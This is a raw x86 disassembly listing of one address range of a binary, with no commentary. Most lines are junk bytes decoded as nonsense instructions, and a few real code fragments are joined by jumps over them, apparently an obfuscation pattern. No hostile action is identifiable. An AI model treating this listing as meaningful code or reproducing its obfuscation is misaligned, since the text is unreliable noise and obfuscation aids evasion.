  407ac9:	out    0xc1,eax
  407acb:	xchg   ebp,eax
  407acc:	adc    dl,bh
  407ace:	popf   
  407acf:	pop    ebx
  407ad0:	and    al,0x21
  407ad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ad3:	pusha  
  407ad4:	ret    0xc235
  407ad7:	int    0x1
  407ad9:	arpl   di,di
  407adb:	xchg   ebx,eax
  407adc:	add    bh,dl
  407ade:	and    ch,BYTE PTR [esi+esi*1-0x1]
  407ae2:	ss push ecx
  407ae4:	and    al,0xd
  407ae6:	cs aam 0x5e
  407ae9:	data16 hlt 
  407aeb:	sub    eax,0x5ee11a2e
  407af0:	daa    
  407af1:	push   ds
  407af2:	enter  0xb33e,0x7f
  407af6:	pop    esp
  407af7:	push   esp
  407af8:	ror    DWORD PTR [ebx+0x39f0a083],cl
  407afe:	rcr    BYTE PTR [ebx-0x34c47cf2],1
  407b04:	mov    BYTE PTR [esi],bh
  407b06:	inc    esp
  407b07:	inc    edi
  407b08:	or     BYTE PTR [edi+0x7d],dl
  407b0b:	das    
  407b0c:	cld    
  407b0d:	mov    fs,WORD PTR [esi-0x1e]
  407b10:	stos   BYTE PTR es:[edi],al
  407b11:	test   BYTE PTR [edi+0x62643b1a],dh
  407b17:	mov    eax,DWORD PTR [ebp+0x8]
  407b1a:	movzx  eax,WORD PTR [eax+edx*4]
  407b1e:	xor    eax,0x8a40
  407b23:	add    eax,edi
  407b25:	mov    edi,DWORD PTR [ebp-0x14]
  407b28:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407b2c:	mov    eax,DWORD PTR [ebp-0xc]
  407b2f:	inc    edx
  407b30:	cmp    edx,eax
  407b32:	jne    0x407679
  407b38:	pop    edi
  407b39:	pop    ebx
  407b3a:	jmp    0x407cbb
  407b3f:	fistp  QWORD PTR [edi]
  407b41:	aas    
  407b42:	or     bl,bh
  407b44:	or     ch,bl
  407b46:	jmp    0x407b0d
  407b48:	jle    0x407b96
  407b4a:	dec    ebx
  407b4b:	inc    ecx
  407b4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b4d:	add    al,0x5d
  407b4f:	jge    0x407b16
  407b51:	jle    0x407bd1
  407b53:	sar    BYTE PTR [edi+0x7e],cl
  407b56:	jle    0x407bad
  407b58:	repnz jecxz 0x407b99
  407b5b:	adc    DWORD PTR [edx],ecx
  407b5d:	bound  ebx,QWORD PTR es:[esi+eiz*8-0x20]
  407b62:	jnp    0x407b48
  407b64:	jl     0x407b7e
  407b66:	push   ebp
  407b67:	mov    BYTE PTR [ebx+0x43],0x5e
  407b6b:	add    DWORD PTR [ebx+0x2],eax
  407b6e:	jne    0x407b89
  407b70:	in     al,dx
  407b71:	xchg   BYTE PTR [ecx+0x54],dl
  407b74:	leave  
  407b75:	xor    cl,bl
  407b77:	and    al,0xb0
  407b79:	xor    cl,BYTE PTR [eax+0x524aeeae]
  407b7f:	pop    edx
  407b80:	xchg   ebp,eax
  407b81:	or     eax,0x8857b71f
  407b86:	sbb    al,0x76
  407b88:	mov    fs,WORD PTR [ebx]
  407b8a:	mov    ch,0xa6
  407b8c:	cmp    BYTE PTR [ebx+0x7d4366d0],ch
  407b92:	aam    0xe7
  407b94:	xchg   edx,eax
  407b95:	mov    dh,0x4f
  407b97:	dec    eax
  407b98:	ss inc esp
  407b9a:	push   ss
  407b9b:	les    eax,FWORD PTR [eax+edx*4+0x10601dfc]
  407ba2:	shr    edi,1
  407ba4:	push   ss
  407ba5:	inc    edi
  407ba6:	data16 aad 0xef
  407ba9:	not    dh
  407bab:	lock in al,dx
  407bad:	sbb    BYTE PTR [eax],bl
  407baf:	pusha  
  407bb0:	jp     0x407b9e
  407bb2:	aad    0x17
  407bb4:	ja     0x407be2
  407bb6:	sub    DWORD PTR [edx+0x13],ecx
  407bb9:	or     bh,cl
  407bbb:	repz push esp
  407bbd:	(bad)  
  407bbf:	call   0xe107b10d
  407bc4:	and    DWORD PTR [ebx],eax
  407bc6:	jp     0x407c2b
  407bc8:	xchg   DWORD PTR [ebp-0x340fa801],ebp
  407bce:	push   eax
  407bcf:	and    eax,DWORD PTR [eax+esi*1]
  407bd2:	jo     0x407b8c
  407bd4:	add    esi,ebx
  407bd6:	retf   0xd5ee
  407bd9:	dec    ecx
  407bda:	pop    edx
  407bdb:	mov    edi,0x6402b035
  407be0:	push   0xffffffc6
  407be2:	hlt    
  407be3:	mov    dh,0xcf
  407be5:	lods   al,BYTE PTR ds:[esi]
  407be6:	cs loop 0x407bac
  407be9:	xor    ebx,DWORD PTR [eax+0x499cb68a]
  407bef:	dec    ebx
  407bf0:	adc    al,0x65
  407bf3:	les    ecx,FWORD PTR [edi]
  407bf5:	jle    0x407c5f
  407bf7:	sbb    bh,0x1a
  407bfa:	xor    ah,cl
  407bfc:	pusha  
  407bfd:	xor    esi,DWORD PTR [eax]
  407bff:	data16 test BYTE PTR [ecx],cl
  407c02:	mov    dl,0x6
  407c04:	hlt    
  407c05:	lea    bx,[ebp-0x3dbdd89]
  407c0c:	ins    DWORD PTR es:[edi],dx
  407c0d:	ins    DWORD PTR es:[edi],dx
  407c0e:	arpl   WORD PTR [ebp+0x4],sp
  407c11:	icebp  
  407c12:	bound  edx,QWORD PTR [ecx-0x40]
  407c15:	inc    ecx
  407c16:	xor    dl,BYTE PTR [edx]
  407c18:	add    bh,BYTE PTR [esi+0x23]
  407c1b:	mov    eax,ds:0x35f2c617
  407c20:	adc    DWORD PTR [edi],ebx
  407c22:	(bad)  
  407c23:	loop   0x407bfa
  407c25:	mov    edx,0x330baab1
  407c2a:	cs das 
  407c2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c2d:	into   
  407c2e:	jns    0x407bd8
  407c30:	mov    DWORD PTR [ebx+0x31],edx
  407c33:	stos   DWORD PTR es:[edi],eax
  407c34:	cmp    ch,0xd7
  407c37:	pop    ss
  407c38:	pop    es
  407c39:	loope  0x407bc2
  407c3b:	in     al,0xac
  407c3d:	cmp    BYTE PTR [ebp-0x9],bh
  407c40:	xor    esi,0x55b4ad9f
  407c46:	or     BYTE PTR [ebx+ebx*4],bh
  407c49:	jno    0x407c25
  407c4b:	(bad)  
  407c4c:	dec    DWORD PTR [edx+0x36]
  407c4f:	(bad)  
  407c50:	into   
  407c51:	repz data16 fisub WORD PTR [ecx+0x5e]
  407c56:	push   ds
  407c57:	xor    BYTE PTR ds:0x7702f654,bl
  407c5d:	xor    edi,DWORD PTR [esi]
  407c5f:	sar    ecx,1
  407c61:	mov    dh,0x65
  407c63:	shl    BYTE PTR [esp+edi*4+0x25],0xac
  407c68:	xchg   ebp,eax
  407c69:	adc    esi,DWORD PTR [ecx-0x65250b8]
  407c6f:	push   ds
  407c70:	and    esi,DWORD PTR [esi+0x7f]
  407c73:	dec    ecx
  407c74:	mov    cl,0x65
  407c76:	inc    ecx
  407c77:	nop
  407c78:	add    cl,BYTE PTR [edx]
  407c7a:	xor    eax,esp
  407c7c:	in     eax,0xc5
  407c7e:	mov    ecx,esi
  407c80:	or     al,0x9d
  407c82:	js     0x407cf3
  407c84:	add    DWORD PTR [esi+0x68],esi
  407c87:	mov    esp,0xdaed1852
  407c8c:	les    ecx,FWORD PTR [ebp+0x7dad2445]
  407c92:	pop    ss
  407c93:	mov    dh,0x9d
  407c95:	(bad)  
  407c96:	push   ecx
  407c97:	adc    eax,0xddb894f0
  407c9c:	mov    fs,eax
  407c9e:	inc    ecx
  407c9f:	push   ecx
  407ca0:	je     0x407cc2
  407ca2:	out    0x8,eax
  407ca4:	(bad)  
  407ca5:	jnp    0x407cac
  407ca7:	fldcw  WORD PTR [ebp+0x29]
  407caa:	mov    ebp,0x6360f3a3
  407caf:	mov    esp,0x8350035e
  407cb4:	in     eax,0x3f
  407cb6:	sti    
  407cb7:	and    dh,BYTE PTR [ebp-0x2f]
  407cba:	jnp    0x407c47
  407cbc:	inc    ebp
  407cbd:	clc    
  407cbe:	mov    edx,DWORD PTR [ebp+0x10]
  407cc1:	xor    eax,ecx
  407cc3:	add    eax,esi
  407cc5:	mov    DWORD PTR [edx],eax
  407cc7:	mov    eax,DWORD PTR [ebp-0x8]
  407cca:	xor    eax,ecx
  407ccc:	add    eax,esi
  407cce:	jmp    0x407e4f
  407cd3:	mov    bh,0xb6
  407cd5:	(bad)  
  407cd6:	ror    DWORD PTR [edi+0x86a7bfb],cl
  407cdc:	dec    ebx
  407cdd:	ror    DWORD PTR [edx],cl
  407cdf:	les    dx,DWORD PTR [ebp-0x70]
  407ce3:	rol    edi,1
  407ce5:	jle    0x407d65
  407ce7:	sar    BYTE PTR [edi+0x7e],cl
  407cea:	jle    0x407d4d
  407cec:	fistp  WORD PTR [edi+0x42a37853]
  407cf2:	mov    eax,ds:0xac40f905
  407cf7:	call   0xc5b6:0x9244edaf
  407cfe:	ss cli 
  407d00:	nop
  407d01:	popf   
  407d02:	lahf   
  407d03:	inc    ecx
  407d04:	or     eax,DWORD PTR [edx+0x42]
  407d07:	aas    
  407d08:	adc    ebp,0x28
  407d0b:	sbb    esi,esi
  407d0d:	imul   edx,DWORD PTR [esi-0x83be3a3],0xa70e4be4
  407d17:	fdiv   DWORD PTR [ebx-0x4c716273]
  407d1d:	mov    ebp,0xf23b7f3d
  407d22:	push   edi
  407d23:	or     BYTE PTR [ebx-0x6d6db3c1],cl
  407d29:	test   eax,0x51f4a7f
  407d2e:	push   sp
  407d30:	push   ebx
  407d31:	imul   ebp,DWORD PTR [ecx-0x5ebc0ea9],0x63
  407d38:	push   cs
  407d39:	fwait
  407d3a:	shld   esp,edi,0x52
  407d3e:	int3   
  407d3f:	and    eax,0x4ecedf7b
  407d44:	adc    DWORD PTR [ebx],ecx
  407d46:	push   es
  407d47:	into   
  407d48:	pop    edi
  407d49:	push   ecx
  407d4a:	ss mov esp,0xbedb79fe
  407d50:	push   cs
  407d51:	sub    ebx,DWORD PTR gs:[edx+0x75]
  407d55:	mov    WORD PTR [eax],gs
  407d57:	mov    bh,ah
  407d59:	out    0x1a,eax
  407d5b:	xchg   ecx,eax
  407d5c:	in     eax,dx
  407d5d:	push   cs
  407d5e:	sbb    eax,DWORD PTR [edi]
  407d60:	push   0xffffffcf
  407d62:	fadd   DWORD PTR [eax+ebp*8+0x7494706d]
  407d69:	fnsave [edi-0x439c9953]
  407d6f:	arpl   di,di
  407d71:	or     eax,0x3e87d206
  407d76:	pushf  
  407d77:	sub    ch,ch
  407d79:	cmp    eax,0xafb5f858
  407d7e:	jne    0x407dd2
  407d80:	(bad)  
  407d81:	xor    ebx,DWORD PTR [esi-0x4f7ae962]
  407d87:	fnstcw WORD PTR [edx-0x63]
  407d8a:	addr16 das 
  407d8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d8d:	cmp    BYTE PTR [esi-0x418169a3],ah
  407d93:	in     al,dx
  407d94:	mov    bh,0x3
  407d96:	adc    ah,dl
  407d98:	std    
  407d99:	xchg   edx,eax
  407d9a:	lds    ebp,FWORD PTR [ebx+0x55]
  407d9d:	inc    esp
  407d9e:	out    dx,eax
  407d9f:	mov    dh,0xef
  407da1:	(bad)  
  407da2:	outs   dx,BYTE PTR ds:[esi]
  407da3:	jle    0x407dd2
  407da5:	and    BYTE PTR [edi-0x38d9aaf4],0x1a
  407dac:	addr16 pop ds
  407dae:	sbb    eax,0x68cbdbbb
  407db3:	jns    0x407dca
  407db5:	lock movs BYTE PTR es:[edi],BYTE PTR cs:[esi]
  407db8:	lahf   
  407db9:	ret    0x3bff
  407dbc:	fstp   TBYTE PTR [ebx+0x6f9feb0a]
  407dc2:	and    eax,0xaec6caa6
  407dc7:	rcl    BYTE PTR [esi+0x5f],cl
  407dca:	retf   0x7129
  407dcd:	adc    al,0x4b
  407dcf:	sub    ebx,DWORD PTR [ebp-0x7]
  407dd2:	and    eax,0xf8feabee
  407dd7:	mov    cl,0x12
  407dd9:	out    0x60,al
  407ddb:	rcr    BYTE PTR [edx],1
  407ddd:	mov    esi,0xe5d33fac
  407de2:	and    BYTE PTR [ebx-0x13],cl
  407de5:	aam    0xb7
  407de7:	mov    ebx,DWORD PTR ds:0x97fca15a
  407ded:	out    dx,al
  407dee:	pop    esp
  407def:	hlt    
  407df0:	jne    0x407e19
  407df2:	dec    eax
  407df3:	aam    0xb4
  407df5:	xchg   esi,eax
  407df6:	and    al,0x21
  407df8:	(bad)  
  407df9:	dec    ebx
  407dfa:	inc    ebx
  407dfb:	jge    0x407e79
  407dfd:	mov    ds:0x901f6ec7,al
  407e02:	xlat   BYTE PTR ds:[ebx]
  407e03:	stos   BYTE PTR es:[edi],al
  407e04:	and    BYTE PTR [ebp+0xf],bl
  407e07:	inc    edi
  407e08:	inc    ebp
  407e09:	jbe    0x407e43
  407e0b:	in     al,0x52
  407e0d:	leave  
  407e0e:	aas    
  407e0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e10:	and    DWORD PTR [eax+0x3d],esp
  407e13:	dec    eax
  407e14:	adc    esi,DWORD PTR [esi-0x6a]
  407e17:	mov    edi,ebx
  407e19:	stos   BYTE PTR es:[edi],al
  407e1a:	jno    0x407dd2
  407e1c:	fld    QWORD PTR [eax-0x73820d19]
  407e22:	mov    dh,0x7a
  407e24:	outs   dx,DWORD PTR ds:[esi]
  407e25:	in     eax,dx
  407e26:	sbb    al,BYTE PTR ds:0x87faa8f1
  407e2c:	and    al,0x6b
  407e2e:	stos   DWORD PTR es:[edi],eax
  407e2f:	int    0xa0
  407e31:	mov    al,0x5f
  407e33:	ret    0x15e
  407e36:	stos   BYTE PTR es:[edi],al
  407e37:	lods   eax,DWORD PTR ds:[esi]
  407e38:	in     eax,dx
  407e39:	pop    esp
  407e3a:	daa    
  407e3b:	push   cs
  407e3c:	mov    ds:0xadafd219,al
  407e41:	mov    al,0x74
  407e43:	sbb    eax,0x7ec8e48b
  407e48:	inc    edx
  407e49:	xchg   ebp,eax
  407e4a:	mov    bh,0x52
  407e4c:	retf   0x5f80
  407e4f:	mov    DWORD PTR [ebp+0x8],eax
  407e52:	mov    eax,DWORD PTR [ebp+0x8]
  407e55:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e59:	mov    dl,BYTE PTR [ebp-0x1]
  407e5c:	cmp    al,dl
  407e5e:	je     0x4081a3
  407e64:	mov    eax,DWORD PTR [ebp+0x8]
  407e67:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e6b:	mov    edx,DWORD PTR [ebp+0xc]
  407e6e:	cmp    al,BYTE PTR [edx]
  407e70:	jne    0x40834a
  407e76:	mov    eax,DWORD PTR [ebp-0x8]
  407e79:	mov    edx,DWORD PTR [ebp+0xc]
  407e7c:	movsx  edx,BYTE PTR [edx]
  407e7f:	xor    eax,ecx
  407e81:	add    eax,esi
  407e83:	cmp    edx,eax
  407e85:	je     0x40833e
  407e8b:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  407e92:	lea    eax,[ebp-0x18]
  407e95:	jmp    0x408016
  407e9a:	xchg   BYTE PTR [eax],cl
  407e9c:	mov    al,ds:0xb8a6a08e
  407ea1:	or     BYTE PTR [edx],ah
  407ea3:	mov    bl,cl
  407ea5:	mov    dl,0x1f
  407ea7:	mov    al,0xa1
  407ea9:	adc    DWORD PTR [ebp-0x2d818128],esi
  407eaf:	jg     0x407f2f
  407eb1:	jle    0x407e56
  407eb3:	imul   esi,esp,0xffffff84
  407eb6:	int3   
  407eb7:	xchg   BYTE PTR [eax],bl
  407eb9:	xchg   esp,eax
  407eba:	gs add eax,0x8da9ff07
  407ec0:	nop
  407ec1:	cmp    bl,ah
  407ec3:	pushf  
  407ec4:	aas    
  407ec5:	mov    DWORD PTR [esi+0x49071a01],esi
  407ecb:	or     BYTE PTR [ecx],ch
  407ecd:	std    
  407ece:	nop
  407ecf:	lock ss std 
  407ed2:	imul   ebp,DWORD PTR ds:0xf3eaab2f,0x281ccece
  407edc:	xor    DWORD PTR [esi-0x5c],esp
  407edf:	clc    
  407ee0:	bnd ja 0x407e9f
  407ee3:	mov    ss,esi
  407ee5:	call   0xd8a1:0x80ac2c61
  407eec:	shr    BYTE PTR [edx-0x24],0x5f
  407ef0:	loop   0x407f5a
  407ef2:	pop    edi
  407ef3:	mov    ebp,0x90b84076
  407ef8:	xor    BYTE PTR [edi+0x33cc9ef0],0xbd
  407eff:	adc    eax,0xd5631b7c
  407f04:	xchg   ecx,eax
  407f05:	jg     0x407e91
  407f07:	pop    eax
  407f08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f09:	sub    esp,DWORD PTR [ecx-0x6f9425b5]
  407f0f:	jl     0x407f7a
  407f11:	mov    BYTE PTR [ebp+edx*2+0x10524d64],0x8a
  407f19:	mov    edx,fs
  407f1b:	add    al,0x88
  407f1d:	mov    al,ds:0x20c5d49b
  407f22:	mov    ebx,0x81b6e724
  407f27:	ja     0x407ed5
  407f29:	lock xor al,0x32
  407f2d:	test   esi,edx
  407f2f:	sub    al,0xb1
  407f31:	ins    DWORD PTR es:[edi],dx
  407f32:	ret    
  407f33:	(bad)  
  407f34:	mov    ecx,0x14a9c4b
  407f39:	lea    ebx,[edi-0x267723c4]
  407f3f:	lods   eax,DWORD PTR ds:[esi]
  407f40:	aad    0x29
  407f42:	pop    edx
  407f43:	in     eax,0xa6
  407f45:	sbb    bh,bl
  407f47:	xchg   esp,eax
  407f48:	pusha  
  407f49:	ins    DWORD PTR es:[edi],dx
  407f4a:	loope  0x407f67
  407f4c:	xchg   DWORD PTR [ebp-0x35],edi
  407f4f:	adc    BYTE PTR [eax+eiz*4+0x10c60fdf],dl
  407f56:	pop    ebx
  407f57:	xchg   ecx,eax
  407f58:	fs xchg al,al
  407f5b:	pop    edi
  407f5c:	(bad)  
  407f5d:	jns    0x407f9b
  407f5f:	mov    edi,0xa26dd593
  407f64:	std    
  407f65:	std    
  407f66:	pop    ebp
  407f67:	(bad)  
  407f68:	fistp  WORD PTR [ebp-0x41]
  407f6b:	ins    DWORD PTR es:[edi],dx
  407f6c:	xchg   ebx,eax
  407f6d:	jo     0x407fc4
  407f6f:	pusha  
  407f70:	push   DWORD PTR [ecx+ecx*4+0x48]
  407f74:	outs   dx,DWORD PTR fs:[esi]
  407f76:	pop    ss
  407f77:	lods   eax,DWORD PTR ds:[esi]
  407f78:	test   al,0xa2
  407f7a:	xor    bh,ch
  407f7c:	cmp    cl,BYTE PTR [eax-0x10]
  407f7f:	cmc    
  407f80:	jl     0x407f1e
  407f82:	and    DWORD PTR [eax-0x10d6df2],eax
  407f88:	mov    esi,0xf951e489
  407f8d:	mov    bh,0xed
  407f8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f90:	pop    eax
  407f91:	sub    ah,bh
  407f93:	inc    esp
  407f94:	jb     0x407f5e
  407f96:	sub    DWORD PTR ds:0x134cd47e,edi
  407f9c:	fisttp WORD PTR [edx+0x53]
  407f9f:	xor    dl,BYTE PTR [edx]
  407fa1:	jp     0x407f69
  407fa3:	out    dx,al
  407fa4:	lock cli 
  407fa6:	mov    esp,0xa11fb04e
  407fab:	arpl   WORD PTR [edi],bx
  407fad:	jmp    0x40801e
  407faf:	out    0xe5,al
  407fb1:	xchg   ecx,eax
  407fb2:	mov    edx,0xbb87e954
  407fb7:	(bad)  
  407fb8:	test   BYTE PTR [edi],0x2a
  407fbb:	xor    bh,BYTE PTR [edi-0x804fde4]
  407fc1:	pop    edi
  407fc2:	push   edx
  407fc3:	cld    
  407fc4:	jno    0x407f49
  407fc6:	xor    al,0x8f
  407fc8:	les    edx,FWORD PTR [ebp+0x3c]
  407fcb:	push   es
  407fcc:	(bad)  
  407fcd:	push   ss
  407fce:	xchg   esp,eax
  407fcf:	add    ecx,DWORD PTR [edx-0x3bd718ff]
  407fd5:	fwait
  407fd6:	xor    esp,DWORD PTR [ebx-0x2f]
  407fd9:	pop    ebx
  407fda:	cli    
  407fdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fdc:	or     eax,0x54b21497
  407fe1:	jbe    0x407fa2
  407fe3:	popf   
  407fe4:	adc    esi,DWORD PTR [edx-0x430e87f]
  407fea:	add    eax,0xfbf20925
  407fef:	ins    DWORD PTR es:[edi],dx
  407ff0:	xchg   ebp,eax
  407ff1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ff2:	inc    esi
  407ff3:	ror    bh,cl
  407ff5:	int3   
  407ff6:	pop    edi
  407ff7:	clc    
  407ff8:	loop   0x407f9c
  407ffa:	inc    ebp
  407ffb:	lds    ebp,FWORD PTR [edi+0x161e65c9]
  408001:	pusha  
  408002:	stos   DWORD PTR es:[edi],eax
  408003:	push   esi
  408004:	(bad)  
  408005:	xor    BYTE PTR [bp+si-0x2983],dh
  40800a:	test   BYTE PTR [ecx-0x14],dl
  40800d:	leave  
  40800e:	mov    es,WORD PTR [esi-0x28]
  408011:	jmp    0x4589:0x6bc54d6
  408018:	in     al,dx
  408019:	mov    eax,DWORD PTR [ebp-0x14]
  40801c:	add    DWORD PTR [eax],0x705fa8f
  408022:	jmp    0x4081a3
  408027:	test   al,0x70
  408029:	cmp    ch,BYTE PTR [ecx-0x46]
  40802c:	jge    0x4080ab
  40802e:	xor    DWORD PTR [edx-0x4f],eax
  408031:	imul   esi,DWORD PTR [edx+0x2d955393],0x7e7eda29
  40803b:	sar    BYTE PTR [edi+0x7e],cl
  40803e:	jle    0x40809d
  408040:	(bad)  
  408042:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408043:	out    dx,al
  408044:	xor    BYTE PTR [ebp+eax*2-0x7b],cl
  408048:	call   0x3ec1:0x60847a2c
  40804f:	(bad)  
  408050:	(bad)  
  408051:	jnp    0x408069
  408053:	rol    bh,1
  408055:	xchg   edi,eax
  408056:	or     al,BYTE PTR [edi+0x6a]
  408059:	mov    esp,0x679f9a06
  40805e:	pop    ecx
  40805f:	xchg   ebx,eax
  408060:	add    eax,0x2a762ec3
  408065:	sbb    BYTE PTR [ebx-0x763a3b44],dl
  40806b:	mov    bh,0x26
  40806d:	cwde   
  40806e:	mov    esi,0x266672c5
  408073:	in     eax,0x26
  408075:	push   0x4
  408077:	retf   0xcefa
  40807a:	sar    BYTE PTR [edx],cl
  40807c:	iret   
  40807d:	pop    es
  40807e:	cld    
  40807f:	aaa    
  408080:	mov    edx,0xbf3d92b3
  408085:	add    bh,BYTE PTR [edi]
  408087:	adc    al,0xc6
  408089:	push   ss
  40808a:	jb     0x408079
  40808c:	test   eax,0xfbac7c47
  408091:	xor    cl,BYTE PTR ds:0xe264f44b
  408097:	out    0x25,eax
  408099:	loop   0x408083
  40809b:	lahf   
  40809c:	(bad)  
  40809e:	add    eax,0x3d583d1
  4080a3:	jmp    0x4080be
  4080a5:	lods   al,BYTE PTR ds:[esi]
  4080a6:	aad    0x80
  4080a8:	(bad)  
  4080a9:	cli    
  4080aa:	xor    al,0x4f
  4080ac:	sbb    bl,0x87
  4080af:	adc    ebp,DWORD PTR [ebp+0x52]
  4080b2:	add    dl,BYTE PTR [edi]
  4080b4:	arpl   WORD PTR [ebp+0x2179fcd1],si
  4080ba:	(bad)  [edx+ebp*8+0x4b]
  4080be:	fs inc ebp
  4080c0:	out    0x8f,eax
  4080c2:	scas   al,BYTE PTR es:[edi]
  4080c3:	pusha  
  4080c4:	push   edi
  4080c5:	idiv   DWORD PTR [edi-0x36a42ed3]
  4080cb:	cmp    BYTE PTR [esi-0x7c7f68ab],0x11
  4080d2:	push   esi
  4080d3:	outs   dx,BYTE PTR ds:[esi]
  4080d4:	loope  0x408081
  4080d6:	sar    DWORD PTR [esi],cl
  4080d8:	repnz popf 
  4080da:	push   ebp
  4080db:	ja     0x408128
  4080dd:	xchg   esp,eax
  4080de:	stos   BYTE PTR es:[edi],al
  4080df:	push   ecx
  4080e0:	cmc    
  4080e1:	test   DWORD PTR [edi],ecx
  4080e3:	neg    dl
  4080e5:	push   ebp
  4080e6:	outs   dx,BYTE PTR ds:[esi]
  4080e7:	sub    al,0xfc
  4080e9:	or     bh,BYTE PTR [ecx-0x7576fb61]
  4080ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080f0:	jge    0x408170
  4080f2:	into   
  4080f3:	out    dx,eax
  4080f4:	(bad)  
  4080f5:	jl     0x408153
  4080f7:	mov    edi,0xbda4b1c4
  4080fc:	sbb    cl,ch
  4080fe:	and    BYTE PTR [edx+0x73],al
  408101:	(bad)  
  408102:	lds    ecx,FWORD PTR [ecx]
  408104:	fld    QWORD PTR [ebp-0x7d391b25]
  40810a:	ins    DWORD PTR es:[edi],dx
  40810b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40810c:	lea    ebp,[ebx+0x37239b16]
  408112:	adc    esp,DWORD PTR [edx+eax*2-0x521742f6]
  408119:	jge    0x4080f4
  40811b:	mov    esi,0xff9d3f79
  408120:	inc    esp
  408121:	es inc esp
  408123:	scas   al,BYTE PTR es:[edi]
  408124:	fdivr  QWORD PTR [esi]
  408126:	loope  0x40815b
  408128:	inc    edi
  408129:	add    BYTE PTR [eax],dh
  40812b:	or     al,0x61
  40812d:	imul   ebp,eax,0x55
  408130:	lods   eax,DWORD PTR ds:[esi]
  408131:	imul   ebx,DWORD PTR [ecx-0x7a],0x450b1bb6
  408138:	lods   al,BYTE PTR ds:[esi]
  408139:	cmp    eax,DWORD PTR [ebx+0x5a62f6f3]
  40813f:	pop    ecx
  408140:	jmp    0xac65:0x64d72031
  408147:	add    bl,dl
  408149:	(bad)  
  40814b:	dec    edx
  40814c:	add    DWORD PTR [edi],eax
  40814e:	fisub  WORD PTR [eax-0x38cd50d9]
  408154:	mov    ebx,DWORD PTR [eax-0x1e]
  408157:	dec    eax
  408158:	cmp    esi,esi
  40815a:	adc    eax,0xcb6440aa
  40815f:	ret    
  408160:	jle    0x40815a
  408162:	jg     0x408160
  408164:	nop
  408165:	jbe    0x4081e6
  408167:	mov    cl,0x37
  408169:	mov    dl,0x2f
  40816b:	loop   0x4081de
  40816d:	int3   
  40816e:	inc    esi
  40816f:	xchg   esi,eax
  408170:	popa   
  408171:	push   esp
  408172:	cli    
  408173:	mov    eax,ds:0xd7cc2ce8
  408178:	in     eax,0x17
  40817a:	sub    ecx,edx
  40817c:	fcmove st,st(4)
  40817e:	rcl    BYTE PTR [eax],cl
  408180:	jle    0x4081f1
  408182:	adc    eax,0xd90d779d
  408187:	call   0xad9db541
  40818c:	(bad)  
  40818d:	sub    al,0x80
  40818f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408190:	xor    esi,edx
  408192:	outs   dx,BYTE PTR ds:[esi]
  408193:	imul   eax,DWORD PTR [ebp+0x7c554d97],0x50
  40819a:	inc    edx
  40819b:	inc    ecx
  40819c:	push   cs
  40819d:	mov    bl,0x80
  40819f:	jo     0x4081c0
  4081a1:	inc    esp
  4081a2:	ja     0x40812f
  4081a4:	inc    ebp
  4081a5:	lock mov edx,DWORD PTR [ebp+0x8]
  4081a9:	xor    eax,ecx
  4081ab:	jmp    0x40832c
  4081b0:	dec    edx
  4081b1:	sbb    ch,0x7
  4081b4:	fstp   QWORD PTR [ebx+0x4c]
  4081b7:	inc    ebp
  4081b8:	inc    eax
  4081b9:	jmp    DWORD PTR [ebp-0x35bb71]
  4081bf:	inc    edx
  4081c0:	(bad)  
  4081c1:	fstp   TBYTE PTR [esi+0x7e]
  4081c4:	sar    BYTE PTR [edi+0x7e],cl
  4081c7:	jle    0x408188
  4081c9:	jbe    0x408233
  4081cb:	je     0x4081a0
  4081cd:	inc    ebp
  4081ce:	cmp    bh,BYTE PTR [edx-0x29abfca0]
  4081d4:	mov    DWORD PTR [esi-0x68c9dcf3],eax
  4081da:	cmp    al,0xdf
  4081dc:	pop    edx
  4081dd:	inc    ebp
  4081de:	push   edx
  4081df:	(bad)  
  4081e0:	cmp    BYTE PTR [ebp+ebx*8+0x7d],cl
  4081e4:	pop    esi
  4081e5:	xchg   DWORD PTR ds:0xb8ec6d62,ebp
  4081eb:	xchg   BYTE PTR [edx-0x5d],ch
  4081ee:	inc    ecx
  4081ef:	push   ds
  4081f0:	fwait
  4081f1:	cmp    BYTE PTR [ecx+ebp*4-0x51],bh
  4081f5:	ins    DWORD PTR es:[edi],dx
  4081f6:	call   0x9668:0x5531c221
  4081fd:	jns    0x408185
  4081ff:	mov    edi,0xc2295351
  408204:	push   ecx
  408205:	and    bh,BYTE PTR [eax+edx*8+0xe]
  408209:	cmp    DWORD PTR [edi+ebx*2+0x57c904ed],esp
  408210:	mov    esp,0x928da7ad
  408215:	rcl    DWORD PTR [ebx],1
  408217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408218:	pop    edi
  408219:	pop    es
  40821a:	sub    ah,BYTE PTR [esi-0x76]
  40821d:	xchg   esp,eax
  40821e:	jecxz  0x408282
  408220:	sub    esp,DWORD PTR [esi]
  408222:	out    0x64,al
  408224:	cmp    edx,eax
  408226:	adc    eax,0x31da9937
  40822b:	scas   eax,DWORD PTR es:[edi]
  40822c:	jnp    0x408225
  40822e:	mov    ds,WORD PTR [ebx]
  408230:	mov    dl,0xe5
  408232:	nop
  408233:	dec    edi
  408234:	push   ds
  408235:	cmp    eax,0x12687e9f
  40823a:	and    BYTE PTR [ebp-0x6af8c41d],cl
  408240:	xor    cl,dl
  408242:	jge    0x4082a1
  408244:	enter  0x188,0x45
  408248:	outs   dx,BYTE PTR ds:[esi]
  408249:	push   edx
  40824a:	push   0xe4c54ec0
  40824f:	dec    edx
  408250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408251:	ficomp WORD PTR [esi-0x9]
  408254:	add    al,0x47
